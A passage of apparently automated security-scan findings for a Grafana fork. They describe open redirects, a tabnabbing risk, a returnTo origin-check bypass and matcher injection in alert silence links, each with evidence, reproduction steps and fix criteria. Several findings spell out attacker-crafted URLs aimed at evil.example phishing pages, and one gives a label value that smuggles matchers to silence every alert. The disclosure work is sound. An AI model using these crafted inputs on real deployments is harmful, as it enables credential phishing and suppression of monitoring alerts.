   The Logs query editor's 'CloudWatch Logs Insights' LinkButton (target=_blank) gets href = encodeUrl(..., datasource.resources.getActualRegion(query.region)) as soon as panelData.request.range is present — i.e. after the query has been dispatched, whether or not the backend accepted it. query.region is the raw query-model string. @grafana/ui LinkButton (recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map) only passes href through braintree sanitizeUrl, which blocks javascript:/data:/vbscript: schemes and lets any https host through.
3. [public/app/plugins/datasource/cloudwatch/query-runner/CloudWatchRequest.ts:145–150](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/query-runner/CloudWatchRequest.ts#L145-L150)
   getActualRegion() (inherited by datasource.resources = ResourcesAPI extends CloudWatchRequest) maps only 'default'/''/undefined to the configured default region; every other string is returned unchanged, with no validation and no template interpolation.
4. [public/app/features/explore/hooks/useStateSync/migrators/v1.ts:98–106](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/hooks/useStateSync/migrators/v1.ts#L98-L106)
   Explore URL parsing: applyDefaults() copies `panes[id].queries` from the URL's JSON into pane state verbatim (only Array.isArray is checked). synchronizer/init.ts then passes them through withUniqueRefIds() and initializeExplore(), which dispatches runQueries() (explorePane.ts:217) automatically, so an attacker-authored `region` reaches the CloudWatch Logs editor and the query runs without any user action beyond opening the link.
5. [public/app/features/query/components/QueryEditorRow.tsx:667–701](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/query/components/QueryEditorRow.tsx#L667-L701)
   filterPanelDataToQuery() spreads `...data` into the per-query PanelData handed to the plugin editor, so `request` (set by runRequest.ts:130 before the datasource is called) survives even when the backend returns an error for the bogus region; CloudWatchLink's `panelData?.request?.range` condition is therefore satisfied on the failing-query path.
6. [public/app/plugins/datasource/cloudwatch/components/QueryEditor/QueryHeader.tsx:64–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/components/QueryEditor/QueryHeader.tsx#L64-L72)
   The Region InlineSelect has allowCustomValue, so the query model's `region` is an arbitrary string by design; the same field is settable directly through a dashboard JSON model or an Explore URL.
7. [public/app/plugins/datasource/cloudwatch/utils/datalinks.ts:34–61](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/utils/datalinks.ts#L34-L61)
   Second sink of the same root cause, gated by the unregistered feature toggle `cloudWatchLogsInsightsDataLinks` (not in docs/ or conf/; `@ts-ignore` on the type): the template-interpolated region (`replace(curTarget.region)`, so a `var-region=` URL parameter on a dashboard whose query uses `$region`) is passed to encodeUrl() (line 110) and attached as a DataLink URL on a 'View this query in CloudWatch console' field added to every logs data frame. Not required for the primary path; listed so the fix covers every caller.
8. [public/app/plugins/datasource/cloudwatch/components/Errors/ThrottlingErrorMessage.tsx:10–13](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/datasource/cloudwatch/components/Errors/ThrottlingErrorMessage.tsx#L10-L13)
   Same pattern (`https://${region}.console.aws.amazon.com/servicequotas/...` in a TextLink external href) fed from CloudWatchMetricsQueryRunner getThrottlingErrorMessage/displayAlert with the request target's region. Reachable only when the backend returns a `Throttling:`/`Rate exceeded` error for that target, so not a practical attacker path, but the same root cause and must be covered by the fix.

## Impact
The integrity of what Grafana presents is subverted: a Grafana-rendered button labelled as the AWS console navigates the victim to an attacker-chosen https origin in a new tab (rel=noopener noreferrer). No script runs in the Grafana origin and no Grafana data is modified or read on the primary Explore path (the query content in the link is the attacker's own). Low integrity impact, consistent with open-redirect/link-injection scoring.

## Reproduction steps
1. An unauthenticated attacker only needs to author a URL: Explore copies panes[].queries from the URL JSON verbatim (migrators/v1.ts:106), auto-runs them (explorePane.ts:217), and CloudWatchLink.tsx sets the button href from the raw query region once request.range is present, which filterPanelDataToQuery() preserves even on a backend error. The victim is any logged-in user who can open Explore against a CloudWatch datasource (Explore on by default) and must open the link and then click the 'CloudWatch Logs Insights' button (UI:A). No privilege is required of the attacker and no race or non-default setting is involved on this path; an Editor can also persist the region in a dashboard for viewers.

## Recommended fix
1. aws_url.ts composes the console URL authority and query string from an arbitrary `region` string with no validation and no encoding. The property violated is that a link Grafana labels as the AWS console must always resolve to an AWS console host. Fix criteria: Before building the URL, `region` must be verified to be a well-formed AWS region token (strict allowlist pattern such as /^[a-z]{2}(-gov)?-[a-z]+-\d+$/ or membership in the `regions` resource result); otherwise no link is produced. Build the URL with the URL API so `region` is percent-encoded in the query string. Verify: with region `evil.example/?`, `a@evil.example/` and `x#`, no href whose host is outside *.console.aws.amazon.com, *.console.amazonaws-us-gov.com or *.console.amazonaws.cn is rendered by CloudWatchLink, the logs DataLink, or the throttling message.
2. CloudWatchLink.tsx, utils/datalinks.ts and the throttling-message callers pass the raw or merely interpolated query region to the URL builder, trusting the query model (settable via Explore URL, dashboard JSON or the allowCustomValue Region selector) as if it were a validated region. Fix criteria: Callers must only pass regions that have passed the same validation (preferably after template interpolation so `$region` links work) and must omit the control entirely when validation fails. Verify that an Explore URL carrying a non-region `region` value renders no 'CloudWatch Logs Insights' button and that a valid region still yields the correct console URL.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256295

---

# Provisioning PR banner opens attacker-supplied query-string URL via window.open (open redirect/tabnabbing)

## Details
The Git-sync preview banner renders a prominent call-to-action button ('Open pull request in GitHub', 'View pull request in GitLab', 'Open in repository') whose target URL is taken verbatim from the page's query string and opened with window.open without noopener.

`usePullRequestParam` (hooks/usePullRequestParam.ts:10-23) reads `pull_request_url`, `new_pull_request_url` and `repo_url` from `location.search` (via useUrlParams -> URLSearchParams) and passes them through `textUtil.sanitizeUrl` only. As recovered for this scan, that is braintree sanitize-url 6.0.x: it rejects `javascript:`/`data:`/`vbscript:` but accepts any `http(s)://host` or `//host`. `ProvisionedFolderPreviewBanner` is mounted unconditionally on every `/dashboards` and `/dashboards/f/<uid>` page (BrowseDashboardsPage.tsx:177) and is gated only by `config.provisioningEnabled` and the absence of `kiosk`; it renders `PreviewBannerViewPR` as soon as any of those params is present, with no binding to a repository, resource, or prior save. `PreviewBannerViewPR` computes `linkUrl = prLink || branchInfo?.repoBaseUrl || repoUrl` and wires the Alert button (`@grafana/ui` Alert renders `<Button onClick={onRemove}>{buttonContent}</Button>`) to `onRemove={() => window.open(textUtil.sanitizeUrl(linkUrl), '_blank')}` (line 110; the behindBranch variant does the same with `repoUrl` at line 86). `repo_type` and `action` let the attacker pick the provider name and the banner wording ('A new resource has been created in a branch in GitHub').

`config.provisioningEnabled` is on by default: `conf/defaults.ini` `[provisioning] enabled = true`, the recovered @grafana/runtime config defaults `provisioningEnabled = true`, and the Git Sync docs state the `provisioning` toggle is 'enabled by default ... starting in Grafana v13, for OSS and Enterprise'. No repository needs to be configured for the banner to render.

Attack: an attacker with no account sends any Grafana user a link such as `https://grafana.example/dashboards?new_pull_request_url=https%3A%2F%2Fgithub.com.evil.example%2Flogin&repo_type=github`. The victim sees an official info banner inside the Grafana chrome; clicking 'Open pull request in GitHub' opens the attacker's page. Because `window.open(url, '_blank')` is called without the `noopener` feature (the browsers' implicit-noopener rule applies only to `<a target=_blank>`), the attacker's page receives `window.opener` and can set `opener.location` to replace the original Grafana tab with a credential-phishing clone while the user looks at the new tab (reverse tabnabbing, CWE-1022). This assumes the server sends no Cross-Origin-Opener-Policy header; none is configured in conf/ or documented, and the Go server is outside this checkout. `PlaylistPage` (`/playlists?new_pull_request_url=...`) and `DashboardPreviewBanner` (`/dashboard/provisioning/<repo>/preview/<path>?pull_request_url=...`, where `existingPRUrl` wins over the backend-returned URL) reach the same sink; the New-folder form renders the same query-sourced URL as an `<a href>` presented as the user's own pull request.

Root cause: URLs the backend returns in `ResourceWrapper.urls` are round-tripped through the query string by `buildResourceBranchRedirectUrl` (utils/redirect.ts) and trusted on read-back, so they are indistinguishable from attacker-supplied ones, and `sanitizeUrl` is a scheme filter, not a destination allow-list. `routes.tsx` RedirectToProvisioningPreview explicitly preserves `pull_request_url` 'from old PR comment links', confirming these parameters are designed to arrive from outside the application. Precondition: the victim can load `/dashboards` (any authenticated user, or anonymous if anonymous access is enabled) and clicks the banner button.

## Evidence
1. [public/app/features/provisioning/components/Shared/PreviewBannerViewPR.tsx:49–110](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/provisioning/components/Shared/PreviewBannerViewPR.tsx#L49-L110)
   PreviewBannerViewPR computes linkUrl = prLink || branchInfo?.repoBaseUrl || repoUrl (line 58) and wires the Alert's action button to onRemove={() => window.open(textUtil.sanitizeUrl(linkUrl), '_blank')} (line 110; the behindBranch variant does the same with repoUrl at line 86). The recovered @grafana/ui Alert renders <Button onClick={onRemove}>{buttonContent}</Button>. sanitizeUrl only strips javascript:/data:/vbscript: schemes, so any https:// host passes, and window.open is called without 'noopener', so the opened page receives window.opener.
2. [public/app/features/provisioning/hooks/usePullRequestParam.ts:8–31](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/provisioning/hooks/usePullRequestParam.ts#L8-L31)
   The only source of prURL/newPrURL/repoURL is the current page's query string (pull_request_url, new_pull_request_url, repo_url) read through useUrlParams/URLSearchParams. The only transformation is textUtil.sanitizeUrl, which does not restrict the host. repo_type is validated against the known provider list only to pick the display name, letting the attacker choose 'GitHub'/'GitLab' wording.
3. [public/app/features/provisioning/components/Folders/ProvisionedFolderPreviewBanner.tsx:10–28](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/provisioning/components/Folders/ProvisionedFolderPreviewBanner.tsx#L10-L28)
   Gated only by config.provisioningEnabled and the absence of kiosk, the banner is rendered purely from the query params: prURL -> PreviewBannerViewPR prURL, newPrURL -> prURL isNewPr, repoURL -> repoUrl behindBranch. No check ties the URL to any repository, resource, or prior user action.
4. [public/app/features/browse-dashboards/BrowseDashboardsPage.tsx:177](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/browse-dashboards/BrowseDashboardsPage.tsx#L177)
   ProvisionedFolderPreviewBanner is mounted unconditionally on the /dashboards browse page (root and every folder), so the crafted link only needs the victim to open /dashboards?new_pull_request_url=... .
5. [conf/defaults.ini:2569–2571](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L2569-L2571)
   [provisioning] enabled = true is the shipped default, so config.provisioningEnabled (which gates the banner) is on without operator action; the Git Sync docs (set-up-before.md) state the toggle is enabled by default in v13 OSS and Enterprise.
6. [public/app/features/provisioning/components/Dashboards/DashboardPreviewBanner.tsx:25–56](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/provisioning/components/Dashboards/DashboardPreviewBanner.tsx#L25-L56)
   Same sink on the provisioning dashboard preview route: existingPRUrl from the pull_request_url param takes precedence over the backend-returned PR URL (line 48) and is passed to PreviewBannerViewPR, so /dashboard/provisioning/<repo>/preview/<path>?pull_request_url=https://evil also yields the 'View pull request in GitHub' button.
7. [public/app/features/playlist/PlaylistPage.tsx:23](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/playlist/PlaylistPage.tsx#L23)
   PlaylistPage reads newPrURL/repoURL from the same hook and mounts PreviewBannerViewPR (line 64) with isNewPr whenever new_pull_request_url is in the query string, a third route to the same window.open sink.
8. [public/app/features/provisioning/components/Folders/NewProvisionedFolderForm.tsx:239–253](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/provisioning/components/Folders/NewProvisionedFolderForm.tsx#L239-L253)
   The same query-sourced prURL is additionally rendered as an <a href> with the URL as link text inside the 'Pull request created' alert of the New folder form; React blocks javascript: here but the attacker-chosen https URL is presented as the user's own pull request.
9. [public/app/features/provisioning/utils/routes.tsx:141–145](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/provisioning/utils/routes.tsx#L141-L145)
   The legacy preview redirect deliberately preserves pull_request_url from 'old PR comment links', confirming these parameters are designed to arrive from outside the application (links posted on the git provider) rather than being generated by a trusted in-app navigation.

## Impact
A trusted Grafana banner sends the victim to an attacker host presented as their own pull request, and because the opened page retains window.opener it can also navigate the original Grafana tab to a phishing clone, enabling convincing credential/session phishing against the Grafana or git-provider login. No Grafana data is read or written directly by the flaw, so confidentiality and integrity impact are limited; no availability impact.

## Reproduction steps
1. No account is needed: the attacker crafts a /dashboards (or /playlists or /dashboard/provisioning/.../preview) URL carrying new_pull_request_url / pull_request_url / repo_url plus repo_type and delivers it to any Grafana user. The banner renders from the query params alone; provisioning is enabled by default in 13.x (conf/defaults.ini [provisioning] enabled = true; runtime config default true; docs say no manual configuration is required), so no deployment condition is needed. The victim must click the banner's 'Open pull request in <provider>' button, which calls window.open on the attacker's URL without noopener.

## Recommended fix
1. PreviewBannerViewPR/usePullRequestParam accept arbitrary absolute URLs from the query string and open them with window.open after only a scheme filter (textUtil.sanitizeUrl), so the destination host is attacker-controlled. Fix criteria: Query-string-derived PR/repository URLs must not be opened unless their origin matches the configured repository URL (or a known provider host) resolved from the backend for the resource in question; otherwise the button is omitted. Verify: /dashboards?new_pull_request_url=https://evil.example renders no actionable button, while a URL returned by the files API for the saved resource still works.
2. Backend-provided PR URLs are round-tripped through the URL bar by buildResourceBranchRedirectUrl and trusted on read-back, making them indistinguishable from attacker-supplied values. Fix criteria: Carry only non-URL identifiers (repository name, ref, path) in the redirect and re-derive the PR/compare URL from the provisioning API on the destination page, as DashboardPreviewBanner already does for its backend-sourced URLs. Verify that no component builds an external navigation target from pull_request_url/new_pull_request_url/repo_url.
3. window.open(url, '_blank') is invoked without 'noopener', so a cross-origin page opened from the banner retains window.opener and can navigate the Grafana tab. Fix criteria: All external navigations from provisioning banners/alerts pass 'noopener,noreferrer' (or use an anchor with rel="noopener noreferrer"). Verify the opened page observes window.opener === null.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256294

---

# Alerting returnTo origin check bypassed under sub-path deployments, yielding protocol-relative redirect href

## Details
`useReturnTo` is the alerting module's single sanitiser for the `?returnTo=` query parameter; its contract (doc comment and tests) is that the value it returns is always a path inside the Grafana app. It does `textUtil.sanitizeUrl(returnTo)`, parses the result with `new URL(value, `${window.location.origin}/${config.appSubUrl}`)`, and accepts it if the protocol is http(s) and the parsed `origin` equals `window.location.origin`, returning `pathname + search`.

The base URL is built with a literal `/` in front of `config.appSubUrl`, and `appSubUrl` already starts with `/` on sub-path deployments (`root_url = https://example.com/grafana`, `serve_from_sub_path = true`, documented in docs/sources/setup-grafana/configure-grafana). The base therefore becomes `https://example.com//grafana`, whose WHATWG path list is `['', 'grafana']`. Resolving a *relative* reference such as `evil.com/phish` against it drops the last base segment and appends the new ones, producing path `['', 'evil.com', 'phish']`, i.e. `pathname === '//evil.com/phish'`, while `origin` remains `https://example.com`. Both checks pass and the hook returns `//evil.com/phish` — a protocol-relative URL. (Absolute inputs like `//evil.com` or `https://evil.com` are correctly rejected because they re-set the origin; with an empty `appSubUrl` the base is `https://host/` and the same input yields the harmless `/evil.com/phish`. The bug is specific to sub-path deployments.)

Every consumer renders the value as `<LinkButton href={returnTo}>`: the back-arrow in the rule viewer title (RuleViewer.tsx:335-348), the generic `components/common/Title.tsx` and `group-details/Title.tsx` back buttons, the Cancel button of the modify-export / export-new-rule pages (ModifyExportRuleForm.tsx:59,111) and of the group edit page (GroupEditPage.tsx:239,388). `LinkButton` only runs `textUtil.sanitizeUrl` (recovered from the @grafana/ui bundle), which passes `//host`, so the anchor's `href` is `//evil.com/phish`.

What happens on activation: Grafana's global `interceptLinkClicks` handles primary-button clicks by `locationService.push(href)`, which stays same-origin (the user lands on an in-app not-found route), so a plain left click is *not* redirected. However the interceptor explicitly returns early for ctrl/meta-clicks (open in new tab), never receives middle-button `auxclick` events, and does not affect the context-menu 'open link in new tab/window' action — in all of those the browser follows the raw `href` and opens `https://evil.com/phish`. An unauthenticated attacker therefore sends a Grafana user a link such as `https://example.com/grafana/alerting/grafana/<any-rule-uid>/view?returnTo=evil.com/grafana/login` (or any page using these titles); the page looks entirely legitimate, and when the victim opens the back/cancel button in a new tab they land on an attacker-controlled site that can impersonate Grafana's login page. The hook is the security control for this parameter, and it fails its stated guarantee.

Root cause: string concatenation of `origin + '/' + appSubUrl` creates a double-slash base, and the post-parse validation inspects only `protocol`/`origin`, never that the resulting `pathname` is a single-slash-rooted path.

## Evidence
1. [public/app/features/alerting/unified/hooks/useReturnTo.ts:24–40](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/hooks/useReturnTo.ts#L24-L40)
   The hook builds its resolution base as `${window.location.origin}/${config.appSubUrl}`. config.appSubUrl already carries a leading slash (e.g. '/grafana'), so on a sub-path deployment the base is 'https://host//grafana', whose WHATWG path is ['', 'grafana']. A relative returnTo such as 'evil.com/x' is resolved by the URL parser against that base: the last segment is dropped and the new segments appended, giving pathname '//evil.com/x' while origin stays 'https://host'. The only check performed is protocol in {http,https} and origin === window.location.origin, both of which pass, and the hook returns `${pathname}${search}` = '//evil.com/x' — a protocol-relative URL that browsers treat as https://evil.com/x.
2. [public/app/features/alerting/unified/components/common/Title.tsx:7–15](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/common/Title.tsx#L7-L15)
   Generic alerting title used by the notification-policies page (components/notification-policies/PolicyPage.tsx:67, route /alerting/routes/policy/:name/edit, returnToFallback '/alerting/routes'); it renders the hook's result verbatim as `<LinkButton href={returnTo}>`. @grafana/ui LinkButton (recovered from public/build/6540.*.js.map, packages/grafana-ui/src/components/Button/Button.tsx) only applies textUtil.sanitizeUrl (braintree sanitize-url 6.0.x: urlSchemeRegex /^.+(:|&colon;)/ finds no scheme in 'evil.com/x', so the string is returned unchanged) and sets no target before emitting `<a href>`.
3. [public/app/features/alerting/unified/components/rule-viewer/RuleViewer.tsx:335–347](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/rule-viewer/RuleViewer.tsx#L335-L347)
   Rule detail page title renders the same `<LinkButton href={returnTo}>` back button from useReturnTo(returnToHref); the rule viewer is reachable by any user who can view rules (URL /alerting/grafana/<uid>/view?returnTo=...).
4. [public/app/features/alerting/unified/group-details/Title.tsx:7–15](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/group-details/Title.tsx#L7-L15)
   Group details page back button, same pattern.
5. [public/app/features/alerting/unified/components/rule-editor/alert-rule-form/ModifyExportRuleForm.tsx:59](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/rule-editor/alert-rule-form/ModifyExportRuleForm.tsx#L59)
   useReturnTo('/alerting/list') on the export/modify-export pages; the value is used at line 111 as the Cancel `<LinkButton href={returnTo}>`.
6. [public/app/features/alerting/unified/group-details/GroupEditPage.tsx:239](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/group-details/GroupEditPage.tsx#L239)
   Group edit page Cancel button (line 388) renders `<LinkButton href={returnTo}>` from the same hook; this route (/alerting/:dataSourceUid/namespaces/:namespaceId/groups/:groupName/edit) requires AlertingRuleUpdate, so it is an Editor-reachable consumer, while the rule-viewer, group-details, export and policy pages need only AlertingRuleRead (Viewer).
7. [public/app/core/navigation/patch/interceptLinkClicks.ts:6–44](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/navigation/patch/interceptLinkClicks.ts#L6-L44)
   The global document click interceptor only neutralises the primary-button path: it returns early for ctrl/meta clicks (line 10) so the browser follows the raw '//evil.com/x' href in a new tab, and middle-button presses fire `auxclick`, which it never sees. For a plain left click it calls locationService.push('//evil.com/x'), which stays same-origin (lands on an in-app not-found route), so the primary click is not a redirect — only the new-tab activations are.
8. [public/app/features/alerting/unified/hooks/useReturnTo.test.tsx:7–11](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/hooks/useReturnTo.test.tsx#L7-L11)
   The tests pin window.location.origin but never set config.appSubUrl, so the sub-path base construction is untested; the maintainers' expectation ('valid URL within the Grafana app') is what the finding contradicts.

## Impact
The outcome is navigation of the victim's browser from a trusted Grafana page to an attacker-chosen origin (phishing / credential capture on a look-alike login page). No Grafana data is read or modified directly and no availability impact; integrity is rated LOW for the loss of navigation trust the returnTo sanitiser is meant to guarantee.

## Reproduction steps
1. Attacker needs no Grafana account: they craft a URL to any alerting page that renders a returnTo back/cancel button (rule viewer /alerting/:sourceName/:id/view, group details, modify-export/export-new-rule, notification-policy edit — all gated only on AlertingRuleRead/NotificationsRead, i.e. Viewer) with `?returnTo=<host>/<path>` (no leading slash) and deliver it to a logged-in Grafana user; a logged-out victim is carried through login and back to the same URL. The deployment must serve Grafana under a sub-path (root_url with a path and serve_from_sub_path, a documented supported configuration that makes config.appSubUrl a '/'-prefixed string), and the victim must open the back/cancel button in a new tab (ctrl/meta-click, middle-click auxclick, or the context menu), since interceptLinkClicks turns a primary click into a same-origin locationService.push (HistoryWrapper basename = config.appSubUrl, so pushState gets '/grafana//evil.com/x'). Assumptions on uninstalled dependencies: WHATWG URL resolution in the browser (relative reference against a base whose path begins with an empty segment keeps that empty segment — verified with a standalone WHATWG parser: new URL('evil.com/x','https://host//grafana') → origin https://host, pathname '//evil.com/x'); @braintree/sanitize-url 6.0.x passes scheme-less input unchanged (source recovered from public/build/7606.*.js.map).

## Recommended fix
1. useReturnTo builds the URL-resolution base by concatenating window.location.origin, a literal '/', and config.appSubUrl, which already begins with '/', so on sub-path deployments the base path has an empty leading segment and relative references resolve to protocol-relative pathnames. Fix criteria: The base used for parsing must be a well-formed single-slash URL for every appSubUrl value (empty or '/sub'), so that `new URL('evil.com/x', base).pathname` is '/evil.com/x' (or the input is rejected). Verify with a unit test that sets config.appSubUrl='/grafana' and asserts `?returnTo=evil.com/x` yields a value that does not start with '//' (or the fallback).
2. Post-parse validation checks only protocol and origin; it never asserts that the returned pathname is an in-app path, so any parser quirk that preserves the origin while producing a protocol-relative or otherwise external-looking pathname is accepted. Fix criteria: The hook must reject (return the fallback for) any result whose pathname does not start with exactly one '/' followed by a non-slash, non-backslash character, independent of how the base was built; the existing malicious-URL tests should be extended with '//evil.com', 'evil.com/x' under a sub-path, and '\\evil.com' variants, all returning the fallback.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256268

---

# Unquoted alert label values injected into silence-link matchers broaden pre-filled silences

## Details
The 'Silence' action shown next to a firing alert (Alert groups page, notification-history detail menu) builds a link to `/alerting/silence/new` whose `matcher` query parameters are derived from the alert's labels by `getMatcherQueryParams` (utils/matchers.ts:131-140) as the bare string `${labelKey}=${labelValue}`. The value is neither quoted nor escaped. The receiving page (`NewSilencePage.tsx` -> `defaultsFromQuery` -> `parseQueryParamMatchers`) parses each parameter with the PromQL-style matcher grammar (`parsePromQLStyleMatcherLoose`), which splits on commas outside double quotes and at the first `=~ / !~ / != / =` operator, then deduplicates by label name keeping the first occurrence.

An alert whose label value contains matcher syntax therefore controls the matchers the silence form is pre-filled with. Example: an alert with labels `{a: ",alertname=~.+,grafana_folder=~.+", alertname: "Real", grafana_folder: "Prod"}` produces `matcher=a=,alertname=~.+,grafana_folder=~.+&matcher=alertname=Real&matcher=grafana_folder=Prod`. Parsing yields `a=""`, `alertname=~".+"`, `grafana_folder=~".+"` and, after `uniqBy('name')`, the real `alertname`/`grafana_folder` matchers are discarded because the injected regex versions came first (the attacker picks any label name that sorts before `alertname`; the Go server marshals the label map with sorted keys, which `Object.entries` preserves). On the Alert groups page `__alert_rule_uid__` is a private label and is stripped, so no rule-UID matcher re-scopes the silence. When the user submits, `SilencesEditor.onSubmit` (line 173) drops matchers with an empty value, so the created silence is `alertname=~".+" AND grafana_folder=~".+"` - every alert in the Grafana Alertmanager is silenced, not the one the user clicked.

Attacker position: whoever authors alert label values that reach the Grafana Alertmanager without holding silence-create rights themselves - a compromised or malicious datasource (or anyone who can write label values into the monitored system) whose query result labels Grafana copies into alert labels (docs: 'Query labels are labels returned by the data source query'; threat-model adversary 4), or a rule author whose silence permission is folder-scoped. The victim is any user with silence-create permission (Editor/Admin by default) who clicks 'Silence' on the attacker's alert and submits the pre-filled form; the matcher rows and the 'Affected alert instances' preview are visible, but the user expects them to describe the alert they clicked. The result is suppression of all alert notifications for the organisation until the silence is noticed and expired - an integrity impact on the alerting pipeline the attacker could not achieve directly. (A rogue external Alertmanager datasource gains nothing, since it already owns its own silences; this finding concerns the Grafana-managed Alertmanager.)

`InstanceDetailsDrawerTitle.tsx:93-95` appends an explicit `__alert_rule_uid__=<uid>` parameter, which re-scopes the silence to the rule and blunts the attack on the triage path; `AlertDetails.tsx:50` and `NotificationDetailActions.tsx:80` do not. The in-repo helpers `labelsToMatchersParam` (matchers.ts:284-291) and `encodeMatcher` (201-207) already quote values with `quoteWithEscape`; `getMatcherQueryParams` is the unquoted sibling.

## Evidence
1. [public/app/features/alerting/unified/utils/matchers.ts:131–140](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/utils/matchers.ts#L131-L140)
   getMatcherQueryParams builds one `matcher=<key>=<value>` URL parameter per non-private alert label by plain concatenation (line 136). The label value is neither quoted nor escaped, so a value containing `,`, `=~`, `!=` or `=` is re-read as additional matcher syntax by the consumer. The sibling labelsToMatchersParam (lines 284-291) and encodeMatcher (201-207) quote values with quoteWithEscape, showing the intended encoding.
2. [public/app/features/alerting/unified/utils/matchers.ts:91–128](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/utils/matchers.ts#L91-L128)
   parseQueryParamMatchers -> parsePromQLStyleMatcherLooseSafe -> parsePromQLStyleMatcherLoose splits each `matcher` parameter on commas that are not inside double quotes (line 93) and parseMatcher (36-63) splits each part at the earliest operator, so `a=,alertname=~.+,grafana_folder=~.+` yields three matchers. `.uniqBy('name')` (line 126) keeps the FIRST matcher per label name, so injected regex matchers that appear in an earlier parameter override the alert's real alertname / grafana_folder equality matchers.
3. [public/app/features/alerting/unified/utils/misc.ts:170–178](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/utils/misc.ts#L170-L178)
   makeLabelBasedSilenceLink appends the unquoted matcher parameters from getMatcherQueryParams to /alerting/silence/new; it is the only producer of label-derived `matcher` parameters.
4. [public/app/features/alerting/unified/components/alert-groups/AlertDetails.tsx:48–57](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/alerting/unified/components/alert-groups/AlertDetails.tsx#L48-L57)
